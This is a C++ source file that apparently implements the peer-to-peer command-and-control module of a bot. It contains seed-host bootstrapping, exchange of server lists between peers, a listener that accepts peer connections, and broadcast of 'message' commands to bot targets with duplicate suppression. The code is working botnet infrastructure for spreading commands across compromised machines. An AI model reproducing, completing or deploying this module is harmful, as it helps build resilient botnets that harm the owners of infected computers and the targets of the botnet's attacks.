#include "main.h"
#include "mainctrl.h"
#include "p2p.h"

CP2PConn::CP2PConn() { m_pManager=NULL; m_bConnected=false; m_sClientSock=0; m_bGotServer=false; m_bSeeded=false; m_bRunning=true; }
CP2PConn::~CP2PConn() throw() { m_pManager=NULL; xClose(m_sClientSock); m_bConnected=false; m_bGotServer=false; m_bSeeded=false; m_bRunning=false; join(); }
void CP2PConn::SetManager(CP2PManager *pManager) { m_pManager=pManager; }
void CP2PConn::SetServer(const char *szServer, int iPort) { m_sServer.Assign(szServer); m_iPort=iPort; m_bGotServer=true; }
const char *CP2PConn::GetServer() { return m_sServer.CStr(); }
bool CP2PConn::GotServer() { return m_bGotServer; } // Do I have a server set ?
bool CP2PConn::IsConnected() { return m_bConnected; } // Am I connected ?
bool CP2PConn::IsRunning() { return m_bRunning; } // Am I running ?
void CP2PConn::QueryServers()
{	m_cMsgIface.SendCmd("server_query", "", 0, NULL); // Send a server query command
	// Receive the reply from the server
	message mMsgReply; if(!m_cMsgIface.RecvCmd(&mMsgReply)) { m_bRunning=false; return; }
	char *szServer=strtok(mMsgReply.szContent, " "); // Split it into tokens
	if(!szServer) g_cMainCtrl.m_cConsDbg.Log(5, "CP2PConn(0x%8.8Xh): Got no servers from query!\n", this);
	while(szServer) // While there are tokens left
	{	// Add the server to the manager
		g_cMainCtrl.m_cConsDbg.Log(5, "CP2PConn(0x%8.8Xh): Got server \"%s\"...\n", this, szServer);
		m_pManager->AddServer(szServer); szServer=strtok(NULL, " "); }
	if(mMsgReply.szContent) free(mMsgReply.szContent); }
void CP2PConn::run() throw()
{	while(!m_pManager) sleep(250); m_bRunning=true; // Wait while we dont have the manager set

	// Get the socket
	m_sClientSock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if(m_sClientSock==-1) return;
	g_cMainCtrl.m_cConsDbg.Log(7, "CP2PConn(0x%8.8Xh): Got new socket %d...\n", this, m_sClientSock);

	while(m_bRunning)
	{	// If not connected and the server is set, connect the socket to the server
		if(!m_bConnected && m_bGotServer && m_bRunning)
		{	// Setup sockaddr, resolve host
			sockaddr_in ssin; in_addr iaddr; hostent *hostent; int iErr;
			memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
			ssin.sin_port=htons(m_iPort); iaddr.s_addr=inet_addr(m_sServer.CStr());
			if(iaddr.s_addr==INADDR_NONE) hostent=gethostbyname(m_sServer.CStr());
			else hostent=gethostbyaddr((const char*)&iaddr, sizeof(struct in_addr), AF_INET);
			if(!hostent) // The host couldn't be resolved, exit
			{	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PConn(0x%8.8Xh): Can't resolve \"%s\"!\n", this, m_sServer.CStr());
				m_bGotServer=false; m_bConnected=false; m_bRunning=false; break; }
			ssin.sin_addr=*((in_addr*)*hostent->h_addr_list);
			
			iErr=connect(m_sClientSock, (sockaddr*)&ssin, sizeof(sockaddr_in));
			if(iErr==-1) // Connect failed, exit
			{	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PConn(0x%8.8Xh): Connection to \"%s:%d\" failed!\n", this, m_sServer.CStr(), m_iPort);
				m_bGotServer=false; m_bConnected=false; m_bRunning=false; break; }
			else
				g_cMainCtrl.m_cConsDbg.Log(3, "CP2PConn(0x%8.8Xh): Connection to \"%s:%d\" established!\n", this, m_sServer.CStr(), m_iPort);
			m_cMsgIface.SetSocket(m_sClientSock); // Tell the message interface what socket to use
#ifdef WIN32
			WSAAsyncSelect(m_sClientSock, 0, WM_USER+1, FD_READ);
#endif
			m_bConnected=true; }
		
		// Its connected to the server, do stuff now!
		if(m_bConnected && m_bRunning)
		{	// If its not seeded, query the list from the server, initial state of seeded is false
			if(!m_bSeeded) { m_pManager->QueryServers(); m_bSeeded=true; }
			// Wait for a message to arrive, we only wait in this thread, CBot is responsible
			// for sending messages, and runs in the main thread
			message mMsg; if(m_cMsgIface.RecvCmd(&mMsg))
			{	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PConn(0x%8.8Xh): Got command \"%s\"...\n", this, mMsg.szCommand);
			
				// Its a broadcast message, broadcast to all servers and clients via the
				// manager, the broadcast function itself checks for dupes, so theres no
				// loopback in the network
				if(strstr(mMsg.szIntFlags, "broadcast")) m_pManager->Broadcast(&mMsg);

				// Its a message directed to the bot, let the manager distribute it to
				// its registered targets. The parts that the bot get are szContent and
				// iContentLength
				if(!strcmp(mMsg.szCommand, "message")) m_pManager->ForTargets(&mMsg);

				// If the message got contents they have to be freed because RecvCmd does
				// a malloc
				if(mMsg.szContent) free(mMsg.szContent); }
			else // The message wasn't correct, or the socket is closed, terminate
				m_bRunning=false; }
		Sleep(250); } // Sleep some time, so we don't overload
	if(m_sClientSock!=-1) xClose(m_sClientSock); m_bRunning=false; }

CP2PServer::CP2PServer() { m_pManager=NULL; m_bRunning=true; }
CP2PServer::~CP2PServer() throw() { m_pManager=NULL; m_bRunning=false; join(); }
void CP2PServer::SetManager(CP2PManager *pManager) { m_pManager=pManager; }
bool CP2PServer::IsRunning() { return m_bRunning; }

void CP2PServer::run() throw()
{	m_bRunning=true; while(m_bRunning && m_sListenSock!=-1)
	{	// Accept an incoming connection from the shared listen socket
		sockaddr_in cssin; socklen_t cssin_len=sizeof(cssin);
		m_sServerSock=accept(m_sListenSock, (sockaddr *)&cssin, &cssin_len);
		if(m_sServerSock!=-1) // We got a client
		{	m_cMsgIface.SetSocket(m_sServerSock); // Tell the message interface what socket to use
			// Get the remote ip via getpeername, and store it in m_sClientIp
			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getpeername(m_sServerSock, &sa, &sas);
			char szTemp[32]; sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
				(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
			m_sClientIp.Assign(szTemp); g_cMainCtrl.m_cConsDbg.Log(3, "CP2PServer(0x%8.8Xh): Connection from \"%s\" accepted!\n", this, m_sClientIp.CStr());
			// Do the same as above with getsockname, and store it in m_sLocalIp
			memset(&sa, 0, sizeof(sa)); getsockname(m_sServerSock, &sa, &sas);
			sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
				(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]); m_sLocalIp.Assign(szTemp);
			while(m_bRunning) // The server loop begins here
			{	message mMsg; if(m_cMsgIface.RecvCmd(&mMsg))
				{	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PServer(0x%8.8Xh): Got command \"%s\"...\n", this, mMsg.szCommand);
					
					// Its a broadcast message, broadcast to all servers and clients via the
					// manager, the broadcast function itself checks for dupes, so theres no
					// loopback in the network
					if(strstr(mMsg.szIntFlags, "broadcast")) m_pManager->Broadcast(&mMsg);

					// Its a message directed to the bot, let the manager distribute it to
					// its registered targets. The parts that the bot get are szContent and
					// iContentLength
					if(!strcmp(mMsg.szCommand, "message")) m_pManager->ForTargets(&mMsg);

					// Its a server query from a client, send the poor guy some servers via
					// server_query_reply
					if(!strcmp(mMsg.szCommand, "server_query"))
					{	CString sServers; sServers.Assign(""); list<CString*>::iterator i;
						for(i=m_pManager->m_lServers.begin(); i!=m_pManager->m_lServers.end(); ++i)
						{	if(!strstr((*i)->CStr(), m_sLocalIp.CStr()) && !strstr((*i)->CStr(), m_sClientIp.CStr()))
							{	sServers.Append((*i)->CStr()); sServers.Append(" "); } }
						if(!m_pManager->m_lServers.size()) {
							sServers.Append(g_cMainCtrl.m_cCmdLine.m_cConfig.sSeedHost);
							sServers.Append(":");
							sServers.Append(g_cMainCtrl.m_cCmdLine.m_cConfig.iSeedPort); }
						m_cMsgIface.SendCmd("server_query_reply", "", sServers.GetLength(), sServers.CStr()); }

					// If the message got contents they have to be freed because RecvCmd does
					// a malloc
					if(mMsg.szContent) free(mMsg.szContent); }
				else // The message wasn't correct, or the socket is closed, terminate
					m_bRunning=false; } }
		xClose(m_sServerSock); }
	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PServer(0x%8.8Xh): Connection from \"%s\" closed!\n", this, m_sClientIp.CStr()); m_bRunning=false; }

void CP2PManager::Init()
{	m_lConns.clear(); m_iMaxConns=20; m_iMaxServs=20; m_iNumConns=0; m_iNumServs=0;
	// Create the shared listen socket on standard port
	sockaddr_in issin; memset(&issin, 0, sizeof(issin)); issin.sin_family=AF_INET;
	issin.sin_addr.s_addr=INADDR_ANY; issin.sin_port=htons(P2P_SERVER_PORT);
	m_sListenSock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sListenSock!=-1) {
#ifdef WIN32
		WSAAsyncSelect(m_sListenSock, 0, WM_USER + 1, FD_READ);
#endif
		bind(m_sListenSock, (sockaddr *)&issin, sizeof(issin)); listen(m_sListenSock, 10); }
	else // Uuhhh, spew something
		g_cMainCtrl.m_cConsDbg.Log(1, "CP2PManager(0x%8.8Xh): Port %d is already bound, or something wicked happened!\n", this, P2P_SERVER_PORT); }
void CP2PManager::Deinit()
{	list<CP2PConn*>::iterator ic; for(ic=m_lConns.begin(); ic!=m_lConns.end(); ++ic) delete (*ic);
	list<CP2PServer*>::iterator is; for(is=m_lServs.begin(); is!=m_lServs.end(); ++is) delete (*is);
	m_lConns.clear(); m_iMaxConns=0; m_iNumConns=0; if(m_sListenSock!=-1) xClose(m_sListenSock); }
void CP2PManager::AddServer(const char *szServer)
{	char *szServerCopy=(char*)malloc(strlen(szServer)+1); strcpy(szServerCopy, szServer);
	char *szRealServer=strtok(szServerCopy, ":");
	char *szPort=strtok(NULL, ":"); if(!szPort) return; int iPort=atoi(szPort);
	AddServer(szRealServer, iPort); free(szServerCopy); }
void CP2PManager::AddServer(const char *szServer, int iPort)
{	// Let the manager think if adding seed, loop through connections after that
	CString *sServer=new CString; bool bDupe=false;
	sServer->Assign(szServer); sServer->Append(":"); sServer->Append(iPort);
	list<CString*>::iterator is; for(is=m_lServers.begin(); is!=m_lServers.end(); ++is)
		if(strstr((*is)->CStr(), szServer)) bDupe=true;
	if(!bDupe) m_lServers.push_back(sServer);
	Think(); list<CP2PConn*>::iterator i; for(i=m_lConns.begin(); i!=m_lConns.end(); ++i)
	{	if((*i)->GotServer()) if(!strcmp((*i)->GetServer(), szServer)) return;
		if(!(*i)->GotServer()) // If the connection has no server set
			(*i)->SetServer(szServer, iPort); return; } }
void CP2PManager::QueryServers()
{	bool bGotConn=false; g_cMainCtrl.m_cConsDbg.Log(5, "CP2PManager(0x%8.8Xh): Starting server query...\n", this);
	// Cycle through connections, and if one is connected, query its server cache
	list<CP2PConn*>::iterator i; for(i=m_lConns.begin(); i!=m_lConns.end(); ++i) if((*i)->IsConnected()) { (*i)->QueryServers(); bGotConn=true; }
	// If there is no connected server, add the seed host from the command line
	if(!bGotConn) AddServer(g_cMainCtrl.m_cCmdLine.m_cConfig.sSeedHost.CStr(), g_cMainCtrl.m_cCmdLine.m_cConfig.iSeedPort);
}
bool CP2PManager::Think()
{	// If there are too few connections, create some new ones
	if(m_iNumConns<m_iMaxConns)
	{	m_iNumConns++; g_cMainCtrl.m_cConsDbg.Log(5, "CP2PManager(0x%8.8Xh): Adding new connection (%d/%d)...\n", this, m_iNumConns, m_iMaxConns);
		CP2PConn *pP2PConn=new CP2PConn; m_lConns.push_back(pP2PConn); pP2PConn->SetManager(this);
		try { pP2PConn->start(); } catch(Synchronization_Exception& e) { g_cMainCtrl.m_cConsDbg.Log(1, "CP2PManager(0x%8.8Xh): %s...\n", this, e.what()); } }

	// If there are too few servers, create some new ones
	if(m_iNumServs<m_iMaxServs)
	{	m_iNumServs++; g_cMainCtrl.m_cConsDbg.Log(5, "CP2PManager(0x%8.8Xh): Adding new server (%d/%d)...\n", this, m_iNumServs, m_iMaxServs);
		CP2PServer *pP2PServer=new CP2PServer; m_lServs.push_back(pP2PServer); pP2PServer->SetManager(this); pP2PServer->m_sListenSock=m_sListenSock;
		try { pP2PServer->start(); } catch(Synchronization_Exception& e) { g_cMainCtrl.m_cConsDbg.Log(1, "CP2PManager(0x%8.8Xh): %s...\n", this, e.what()); } }
	
	// Cycle through connections and check if they wanna continue to run
	list<CP2PConn*>::iterator ic; list<CP2PConn*> lRemoveConn;
	for(ic=m_lConns.begin(); ic!=m_lConns.end(); ++ic)
	{	if(!(*ic)->IsRunning()) lRemoveConn.push_back((*ic)); }
	for(ic=lRemoveConn.begin(); ic!=lRemoveConn.end(); ++ic)
	{	m_lConns.remove((*ic)); delete (*ic); m_iNumConns--; QueryServers(); }

	// Cycle through servers and check if they wanna continue to run
	list<CP2PServer*>::iterator is; list<CP2PServer*> lRemoveServ;
	for(is=m_lServs.begin(); is!=m_lServs.end(); ++is)
	{	if(!(*is)->IsRunning()) lRemoveServ.push_back((*is)); }
	for(is=lRemoveServ.begin(); is!=lRemoveServ.end(); ++is)
	{	m_lServs.remove((*is)); delete (*is); m_iNumServs--; }

	return true; }

void CP2PManager::Broadcast(message *pMsg)
{	Broadcast(pMsg->szCommand, pMsg->szParams, pMsg->szId, pMsg->iContentLength, pMsg->szContent); }
void CP2PManager::Broadcast(const char *szCommand, const char *szParams, const int iContentLength, const char *szContent)
{	char szId[65]; memset(szId, 0, sizeof(szId)); gen_unique_id(szId, sizeof(szId)-1);
	Broadcast(szCommand, szParams, szId, iContentLength, szContent); }
void CP2PManager::Broadcast(const char *szCommand, const char *szParams, const char *szId, const int iContentLength, const char *szContent)
{	list<CString*>::iterator iids; for(iids=m_lIdCache.begin(); iids!=m_lIdCache.end(); ++iids)
	{	if(!strcmp((*iids)->CStr(), szId)) return; }
	CString *psTemp=new CString; psTemp->Assign(szId); m_lIdCache.push_back(psTemp);
	if(m_lIdCache.size()>30) m_lIdCache.pop_front();
//	list<CP2PConn*>::iterator ic; // Cycle through connections and broadcast
//	for(ic=m_lConns.begin(); ic!=m_lConns.end(); ++ic)
//	{	(*ic)->m_cMsgIface.SendCmd(szCommand, szParams, szId, "broadcast", iContentLength, szContent); }
	list<CP2PServer*>::iterator is; // Cycle through servers and broadcast
	for(is=m_lServs.begin(); is!=m_lServs.end(); ++is)
	{	(*is)->m_cMsgIface.SendCmd(szCommand, szParams, szId, "broadcast", iContentLength, szContent); }
	message mTemp; strcpy(mTemp.szCommand, szCommand); strcpy(mTemp.szParams, szParams);
	strcpy(mTemp.szId, szId); strcpy(mTemp.szIntFlags, "loopback");
	mTemp.iContentLength=iContentLength; mTemp.szContent=(char*)malloc(iContentLength+1); memset(mTemp.szContent, 0, iContentLength+1);
	memcpy(mTemp.szContent, szContent, iContentLength); ForTargets(&mTemp); free(mTemp.szContent); }

void CP2PManager::AddTarget(CP2PTarget *pTarget) { m_lTargets.push_back(pTarget); }
void CP2PManager::DelTarget(CP2PTarget *pTarget) { m_lTargets.remove(pTarget); }
void CP2PManager::ForTargets(message *pMsg)
{	list<CP2PTarget*>::iterator it; // Cycle through targets
	for(it=m_lTargets.begin(); it!=m_lTargets.end(); ++it)
		// Call the targets Recv funtion, which is a virtual function in CP2PTarget
		(*it)->Recv(pMsg->szContent, pMsg->iContentLength, pMsg); }
void CP2PTarget::Send(char *szData, int iDataLen)
{	if(!m_pManager) return; // Let the manager broadcast this message
	CString sParams; sParams.Assign("");
	sParams.Format("%s:%s", g_cMainCtrl.m_sUniqueId.CStr(), g_cMainCtrl.m_sUserName.CStr());
	m_pManager->Broadcast("message", g_cMainCtrl.m_sUniqueId.CStr(), iDataLen, szData); }
void CP2PTarget::Send(char *szString) { Send(szString, strlen(szString)); }
void CP2PTarget::SetManager(CP2PManager *pManager) { m_pManager=pManager; }
